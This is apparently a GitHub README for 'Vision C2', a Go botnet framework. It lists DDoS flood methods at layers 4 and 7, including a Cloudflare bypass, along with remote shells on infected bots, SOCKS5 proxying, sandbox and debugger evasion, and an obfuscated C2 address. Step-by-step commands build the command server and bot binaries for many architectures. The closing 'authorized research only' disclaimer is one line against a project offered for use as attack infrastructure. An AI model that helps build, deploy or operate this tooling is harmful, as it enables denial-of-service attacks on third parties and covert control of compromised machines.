
<div align="center">

# ☾℣☽ision C2

**Vision** is a Go-based Botnet framework featuring one-click setup, TLS-secured communications, layered C2 address obfuscation, sandbox evasion, and cross-compiled persistent agents for **14+ architectures**.

![Go](https://img.shields.io/badge/Go-1.23.0+-00ADD8?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-009688?style=for-the-badge)



<img width="973" height="658" alt="Screenshot 2026-02-07 224651" src="https://github.com/user-attachments/assets/9c6d9ada-a8ff-499e-8445-8d8ea2409936" />

 **Changelog:** You can always find the latest and complete change history in  
[`Docs/CHANGELOG.md`](Docs/CHANGELOG.md)

</div>


## CNC/TUI (Bubble Tea)
> Built in BubbleTea for ease of use and arrow key control 

**Features**
- Dashboard: bot count, RAM / CPU usage, uptime
- Bot list with live stats and actions
- Attack builder with method, target, and duration control
- Broadcast shell and per-bot remote shell
- SOCKS5 proxy management
- Built-in help system

---

## ⚔️ Attack Builder

> Vision features a collection of high performance stress testing methods broadcasted to all bots 

### Layer 4 (Network)

| Method    | Protocol     | Technique                     |
|-----------|--------------|-------------------------------|
| UDP Flood | UDP          | 1024-byte payload spam        |
| TCP Flood | TCP          | Connection exhaustion         |
| SYN Flood | Raw TCP      | Raw SYN packets, random ports |
| ACK Flood | Raw TCP      | Raw ACK packets               |
| GRE Flood | Raw GRE (47) | GRE packets, max payload      |
| DNS Flood | UDP / DNS    | Random A/AAAA/MX/NS queries   |

### Layer 7 (Application)

| Method          | Technique                             |
|-----------------|---------------------------------------|
| HTTP Flood      | GET/POST requests, randomized headers |
| HTTPS/TLS Flood | TLS handshake with request bursts     |
| CF Bypass       | Session reuse, cookie persistence     |
| Proxies         | All L7 can optionally use a proxy list|
---



## Remote Shell

> Interactive shell access on each agent with real-time output and command history.

<div align="center">
  <img
<img width="1157" height="675" alt="Screenshot 2026-02-07 224828" src="https://github.com/user-attachments/assets/063bcbf2-bb95-4d92-849e-f7a2ce8fb957" />

</div>


---

## 🚀 Getting Setup

### Dependencies (Ubuntu / Debian)

```bash
sudo apt update && sudo apt install -y \
  upx-ucl openssl git wget gcc python3 screen build-essential
```

### 1️⃣ Clone the Repository

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
chmod +x *
```

### 2️⃣ Run Interactive Setup

```bash
python3 setup.py
```

**The setup script will:**

1. Generate 4096-bit TLS certificates
2. Create encryption keys and magic values
3. Patch configuration into source
4. Cross-compile bot binaries (14+ architectures)
5. Build the CNC server binary

### Output Locations

* **CNC Server:** `./server`
* **Bot Binaries:** `./bins/`
* **Config:** `setup_config.txt`

---

## 🖥️ Running the C2 Server

### Option 1: TUI Mode (Recommended)

```bash
screen ./server
```

* Detach: `Ctrl + A` → `D`
* Reattach: `screen -r`

### Option 2: Telnet / Multi-User Mode

```bash
screen ./server --split
nc your-server-ip 1337
```

* User DB: `cnc/users.json`
* Login keyword: `spamtec`

📘 **Reference:** `Docs/COMMANDS.md`

---

## 🏗️ Architecture Overview

```text
Bot Startup
-----------------
Sandbox / Debug Checks
 ├─ VM, sandbox, debugger detection (VM ENV check, Analysis tools check, Active Debugger check)
 └─ Exit on detection

C2 Address Decryption
 ├─ Base64 → XOR → RC4 → checksum (C2 never hardcoded in plain text)
 └─ DNS resolution chain (Resillient, Supports Txt Recrods, A Records, and Direct IP

Bot ⇄ CNC Protocol
 ├─ TLS handshake (No Plain Text)
 ├─ HMAC challenge / response (Prevent Relay Attacks)
 ├─ Registration payload (botid:arch:ram:cpu:uplink:process)
 └─ Encrypted command loop (TLS 1.2+)
```

---

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH AND STRESS TESTING ONLY**

---

## 👤 Author

**Syn**  
- GitHub: [@syn2much](https://github.com/syn2much)  
- Telegram: [@sinackrst](https://t.me/sinackrst)


---

<p align="center">
<sub>Maintained with ❤️ by Syn</sub>
</p>
